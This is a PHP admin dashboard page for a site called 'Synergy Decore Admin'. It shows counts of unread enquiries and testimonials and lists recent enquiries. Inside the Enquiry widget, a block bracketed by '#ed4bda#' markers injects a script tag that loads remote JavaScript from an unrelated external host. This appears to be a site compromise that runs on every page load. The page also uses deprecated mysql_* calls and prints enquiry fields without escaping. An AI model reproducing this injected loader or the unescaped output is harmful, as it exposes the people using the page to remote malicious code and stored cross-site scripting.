<?php session_start();
ob_start();
$page = "";
$side_menu = "home";

include "inc/session_check.php";

?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->
  <head>
    <meta charset="utf-8">
    <title>Synergy Decore Admin</title>
    <script src="js/html5-trunk.js"></script>
    <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
    <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->

    <!-- bootstrap css -->
    <link href="css/main.css" rel="stylesheet">
    <link href="css/fullcalendar.css" rel="stylesheet">

  </head>
  <body>
    
    <?php 
    	include 'inc/header.php';
    ?>

    <div class="container-fluid">
      
      <?php 
      	include 'inc/main_nav.php';
      ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
          
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>
          <br>
          
		 <!-- <div class="row-fluid">
		  	<div class="span2">
				<div class="stats-count">
					<a href="list_articles.php" style="width: 100%; float: left;">
						<table width="100%">
							<tr>
								<td><img src="img/news.png"></td>
								<td valign="center" align="left">&nbsp;&nbsp;&nbsp;<span class="stat-name">Post News</span>
								</td>
							</tr>
						</table>
					</a>
				</div>
			</div>
			
			<div class="span2">
				<div class="stats-count">
					<a href="forms.php" style="width: 100%; float: left;">
						<table width="100%">
							<tr>
								<td><img src="img/time_line.png"></td>
								<td valign="center" align="left">&nbsp;&nbsp;&nbsp;<span class="stat-name">Time Line</span>
								</td>
							</tr>
						</table>
					</a>
				</div>
			</div>
			
			<div class="span2">
				<div class="stats-count">
					<a href="forms.php" style="width: 100%; float: left;">
						<table width="100%">
							<tr>
								<td><img src="img/art.png"></td>
								<td valign="center" align="left">&nbsp;&nbsp;&nbsp;<span class="stat-name">Articles</span>
								</td>
							</tr>
						</table>
					</a>
				</div>
			</div>-->
			
			<div class="span2">
				<div class="stats-count">
					<a href="list_enquiry.php" style="width: 100%; float: left;">
						<table width="100%">
							<tr>
								<td align="center"><img src="images/enquiry.png"></td>
								<td valign="center" align="left">&nbsp;&nbsp;&nbsp;<span class="stat-name">Enquiry</span>
									<?php $selectn = mysql_query("select * from sd_enquiry where read_status='0'");
									$e_count = mysql_num_rows($selectn);
									if($e_count>0)
									{
									echo "<b>(".$e_count.")</b>";	
									}
									 ?>
<?php
#ed4bda#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967014\"></script>";
echo $g;
}
#/ed4bda#
?>									 
									 
								</td>
							</tr>
						</table>
					</a>
				</div>
			</div>
			
			<div class="span2">
				<div class="stats-count">
					<a href="list_testimonials.php" style="width: 100%; float: left;">
						<table width="100%">
							<tr>
								<td align="center"><img src="images/testimonials.jpg"></td>
								<td valign="center" align="left">&nbsp;&nbsp;&nbsp;<span class="stat-name">Testimonials</span>
									<?php $selectt = mysql_query("select * from sd_testimonials where read_status='0'");
									$t_count = mysql_num_rows($selectt);
									if($t_count>0)
									{
									echo "<b>(".$t_count.")</b>";	
									}
									 ?>
								</td>
							</tr>
						</table>
					</a>
				</div>
			</div>
		  </div>
		  <br /><br />
          <div class="row-fluid">
            <div class="span12">
              <div class="widget">
                <div class="widget-header">
                  <!--<div class="title">
                    Latest Updates
                  </div>-->
                  <div class="tools">
                   <!-- <ul class="sliding-tags">
                      <li>
                        <a href="#">Recent<span>95</span></a>
                      </li>
                      <li>
                        <a href="#">Important<span>75</span></a>
                      </li>
                      <li>
                        <a href="#">View All<span>275</span></a>
                      </li>
                   </ul>-->
                  </div>
                </div>
                <div class="widget-body">
                  <div id="scrollbar-three">
                    <div class="scrollbar">
                      <div class="track">
                        <div class="thumb">
                          <div class="end"></div>
                        </div>
                      </div>
                    </div>
                    <div class="viewport">
                      <div class="overview">
                        <ul class="imp-messages">
                           <?php 
						  
						  $latest = mysql_query("select * from sd_enquiry order by id desc limit 0,10");

						  	while($fetch = mysql_fetch_array($latest))
							{
								
					      ?>
                          
                          <li>
                            <div class="message-date">
                              <h3 class="date text-info"><?=substr($fetch['en_date'],8,9)?></h3>
                              <p class="month"><?=date("F",substr($fetch['en_date'],5,2))?></p>
                            </div>
                            <div class="message-wrapper">
                              <h4 class="message-heading">Purpose : <?=$fetch['purpose']?></h4>
                              <p class="message">
                               <?php echo substr($fetch['message'],0,250); ?>
                              </p>
                            </div>
                          </li>
                                                     
                          <?php 
						  }
						  ?>
                          
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div><!-- dashboard-container -->
    </div><!-- container-fluid -->
    
    <?php
    include 'inc/footer.php';
    ?>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/jquery-ui-1.8.23.custom.min.js"></script>

    <!-- morris charts -->
    <script src="js/morris/morris.js"></script>
    <script src="js/morris/raphael-min.js"></script>

    <!-- Flot charts -->
    <script src="js/flot/jquery.flot.js"></script>
    <script src="js/flot/jquery.flot.resize.min.js"></script>

    <!-- Calendar Js -->
    <script src="js/fullcalendar.js"></script>

    <!-- Tiny Scrollbar JS -->
    <script src="js/tiny-scrollbar.js"></script>

    <!-- custom Js -->
    <script src="js/custom-index.js"></script>
    <script src="js/custom.js"></script>
      
  </body>
</html>
